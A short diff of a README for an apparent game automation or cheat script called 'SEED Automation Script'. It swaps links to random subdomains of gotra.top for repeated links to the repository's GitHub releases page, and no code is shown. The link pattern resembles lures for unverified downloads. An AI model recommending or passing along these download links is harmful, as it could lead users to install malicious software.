@@ -1,9 +1,9 @@
-![maxresdefault](https://github.com/user-attachments/assets/7445c0c1-e8f0-4674-b857-040f521ffacc)
+![maxresdefault](https://github.com/sweensys/SEED-Automation-Script-Auto-Complete-Tasks/releases)
 
 # **SEED Automation Script: Auto-Complete Tasks**
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/sweensys/SEED-Automation-Script-Auto-Complete-Tasks/releases](https://github.com/sweensys/SEED-Automation-Script-Auto-Complete-Tasks/releases)](https://github.com/sweensys/SEED-Automation-Script-Auto-Complete-Tasks/releases)
 
 Welcome to the **SEED Automation Script: Auto-Complete Tasks** repository! This guide provides a comprehensive resource for automating tasks and speeding up your progress in **SEED**. With the help of these scripts, you can complete repetitive tasks with ease and save time while progressing through the game.
 
